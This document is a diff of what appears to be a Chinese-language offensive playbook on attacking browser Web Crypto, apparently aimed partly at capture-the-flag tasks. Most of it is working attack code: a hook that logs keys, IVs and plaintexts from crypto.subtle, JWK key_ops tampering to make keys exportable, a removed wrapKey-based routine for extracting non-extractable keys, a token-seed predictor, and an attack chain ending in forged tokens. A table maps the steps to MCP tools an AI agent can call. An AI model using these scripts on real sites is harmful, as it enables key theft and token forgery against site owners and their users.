+  for (const name of ["importKey","generateKey","deriveKey","encrypt","decrypt","sign","verify","wrapKey","unwrapKey"]) {
+    const orig = crypto.subtle[name].bind(crypto.subtle);
+    crypto.subtle[name] = async (...args) => {
+      console.log("[subtle:req]", name, args.map(enc));
+      const r = await orig(...args);
+      console.log("[subtle:ret]", name, r && (r.type || r.constructor.name), r && r.algorithm, r && r.usages);
+      return r;
+    };
+  }
+  const oldRandom = Math.random;
+  Math.random = function() {
+    const v = oldRandom();
+    console.log("[math.random]", v);
+    return v;
+  };
+})();
+```
 
-async function bypass_extractable(key_to_extract, wrapping_key) {
-    // wrapping_key 必须同时有 wrapKey 和 decrypt 权限
-    // Step 1: wrap key_to_extract
-    const wrapped = await crypto.subtle.wrapKey(
-        'raw',                     // 导出为 raw
-        key_to_extract,            // 我们要窃取的 key
-        wrapping_key,              // 用这个 key 加密
-        {name: 'AES-KW'}           // key wrapping algorithm
-    );
+成功样本：console 输出 key format、algorithm、usages、iv/nonce、明密文样本。失败样本：hook 太晚，crypto 调用已完成；需要导航前注入。
 
-    // Step 2: 用 wrapping_key 解密 wrapped bytes → 拿到 raw key!
-    const raw_key = await crypto.subtle.decrypt(
-        {name: 'AES-CBC', iv: new Uint8Array(16)},
-        wrapping_key,
-        wrapped.slice(8)  // 去掉 KW 头
-    );
-    console.log("Extracted key:", new Uint8Array(raw_key));
-    return raw_key;
+## 1. 模式与 nonce 判定矩阵
+
+| 变体 | 操作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| ECB 检测 | 三个相同明文块 | 密文块重复 | CBC/CTR/GCM 随 IV 改变 |
+| CBC 固定 IV | 同明文重复加密 | 第一块密文相同 | IV 每次随机 |
+| CTR/GCM nonce 复用 | 同 nonce 加密两段明文 | XOR 可消去 keystream | nonce 唯一 |
+| passphrase KDF | 改 salt/iteration | key 可重算 | PBKDF 参数不可见 |
+| key_ops 扩张 | JWK 加 `wrapKey/decrypt` | 能 wrap/export raw key | importKey 拒绝 |
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+from collections import Counter
+
+def chunks(b, n=16):
+    return [b[i:i+n] for i in range(0, len(b), n)]
+
+def decode(s):
+    for fn in (bytes.fromhex, lambda x: base64.b64decode(x + "=" * (-len(x) % 4))):
+        try:
+            return fn(s)
+        except Exception:
+            pass
+    raise SystemExit("cipher must be hex or base64")
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("cipher")
+    ap.add_argument("--block", type=int, default=16)
+    args = ap.parse_args()
+    b = decode(args.cipher.strip())
+    c = chunks(b, args.block)
+    dup = [k.hex() for k, v in Counter(c).items() if v > 1]
+    print({"blocks": len(c), "duplicate_blocks": dup, "guess": "ECB-like" if dup else "CBC/CTR/GCM/stream-like"})
+
+if __name__ == "__main__":
+    main()
+```
+
+## 2. JWK / key_ops 差分
+
+```javascript
+async function jwkDiff(jwk) {
+  const variants = [
+    {...jwk, ext: true, key_ops: ["encrypt","decrypt","wrapKey","unwrapKey"]},
+    {...jwk, extractable: true, key_ops: ["encrypt","decrypt","sign","verify"]},
+    {...jwk, alg: "A256GCM", key_ops: ["encrypt","decrypt"]},
+  ];
+  for (const v of variants) {
+    try {
+      const k = await crypto.subtle.importKey("jwk", v, {name:"AES-GCM"}, true, v.key_ops || ["encrypt"]);
+      console.log("[jwk-hit]", v, k.usages, await crypto.subtle.exportKey("jwk", k));
+    } catch (e) {
+      console.log("[jwk-miss]", v, String(e));
+    }
+  }
 }
 ```
 
-## CryptoJS ECB 降级
+判定：如果前端信任用户可控 JWK 的 `key_ops/ext/alg`，常能把“只能加密”的 key handle 扩成可导出或可 wrap 的材料。
+
+## 3. Math.random token 预测
 
 ```python
-# CryptoJS 默认 CBC，但如果 mode 可控 → 强制 ECB → 电码本模式
-# ECB: 相同明文块 = 相同密文块 → 信息泄露 → 模式识别攻击
+#!/usr/bin/env python3
+import argparse
+import random
+import string
 
-# 探测加密模式:
-# 输入: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" (32个A)
-# ECB → 密文分块相同 → 可直接识别重复块
-# CBC → 需要知道 IV
-# CTR → 流密码，不需要 padding
+ALPH = string.ascii_letters + string.digits
 
-def detect_crypto_mode(encrypt_oracle, block_size: int = 16):
-    """探测加密模式"""
-    plain = b"A" * (block_size * 3)  # 3 个相同块
-    cipher = encrypt_oracle(plain)
-    blocks = [cipher[i:i+block_size] for i in range(0, len(cipher), block_size)]
-    if blocks[1] == blocks[2]:
-        return "ECB"
+def gen(seed, n, length):
+    r = random.Random(seed)
+    for _ in range(n):
+        yield "".join(r.choice(ALPH) for _ in range(length))
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--known")
+    ap.add_argument("--start", type=int, required=True)
+    ap.add_argument("--end", type=int, required=True)
+    ap.add_argument("--length", type=int, default=16)
+    args = ap.parse_args()
+    for seed in range(args.start, args.end + 1):
+        toks = list(gen(seed, 3, args.length))
+        if not args.known or args.known in toks:
+            print(seed, toks)
+
+if __name__ == "__main__":
+    main()
+```
+
+这段用于题面自写 PRNG 或时间戳种子模型。若目标是现代 V8 `Math.random()`，要收集连续输出并用专门状态恢复脚本；hook 的 Evidence 仍是相同的：连续 random、生成位置、token 拼接规则。
+
+## 4. RSA/JWE 材料抽取
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+
+def b64json(part):
+    part += "=" * (-len(part) % 4)
+    return json.loads(base64.urlsafe_b64decode(part.encode()))
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("jwe_or_jwk")
+    args = ap.parse_args()
+    s = args.jwe_or_jwk
+    if "." in s:
+        h = b64json(s.split(".", 1)[0])
+        print(json.dumps({"header": h, "kid": h.get("kid"), "alg": h.get("alg"), "enc": h.get("enc"), "jku": h.get("jku")}, indent=2))
     else:
-        return "CBC/CTR/其他"
+        jwk = json.loads(s)
+        print(json.dumps({k: jwk.get(k) for k in ("kty","kid","alg","use","key_ops","n","e","x","y","k")}, indent=2))
+
+if __name__ == "__main__":
+    main()
 ```
 
 ## 攻击链
 
-```
-Math.random() PRNG crack → Z3 状态恢复 → 密钥预测 → JWT 伪造
-弱 RSA modulus → FactorDB 分解 → 私钥恢复 → JWE 解密 / JWT 签名
-extractable:false bypass → wrapKey + decrypt → raw key export → 密钥泄露
-CryptoJS ECB 模式 → 电码本分析 → 明文恢复 → 密码/session 数据
-Web Crypto importKey → 恶意 JWK → key_ops 设 wrapKey+decrypt → 密钥窃取
+```text
+前端 crypto hook
+  → 抽 key/iv/nonce/plain/cipher
+  → 模式、PRNG、JWK、nonce 单变量差分
+  → 复现 encrypt/decrypt/sign oracle
+  → 伪造 token/signature 或解出 flag payload
 ```
 
 ## Evidence
 
-记录: PRNG 输出的前 30 个值、n 的 FactorDB 结果、wrapped key hex、加密模式检测结果
+| 项 | 记录内容 |
+|---|---|
+| 调用点 | JS 文件、函数名、hook 日志、调用顺序 |
+| key 材料 | format、algorithm、usages、extractable、JWK/raw/derived 参数 |
+| 明密文样本 | plaintext、ciphertext、iv/nonce/tag、编码方式 |
+| 判定结果 | ECB/CBC/CTR/GCM、nonce 是否复用、PRNG 是否可预测 |
+| 成功样本 | 复现解密、伪造签名/token、预测下一 token、导出 raw key |
+| 失败样本 | hook 未覆盖、nonce 唯一、key 不可见、导入 schema 拒绝 |
+| 下一跳 | JWT 转 `02-auth/jwt`；签名转 `13-signature`；支付 token 转 `12-payment` |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| Web Crypto 端点探测 | `http_probe` | HTTP GET 探测 Web Crypto 相关端点 |
-| 知识检索 | `kb_router` | 按 Web Crypto 攻击信号搜索知识库 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 运行时 hook | `jshook` | 注入 Web Crypto/Math.random/CryptoJS hook |
+| 端点探测 | `http_probe` | 抓 bundle、密文 oracle、API 样本 |
+| 知识路由 | `kb_router` | 按 Web Crypto、PRNG、JWK、CryptoJS 信号搜索 |
 
 
 ---
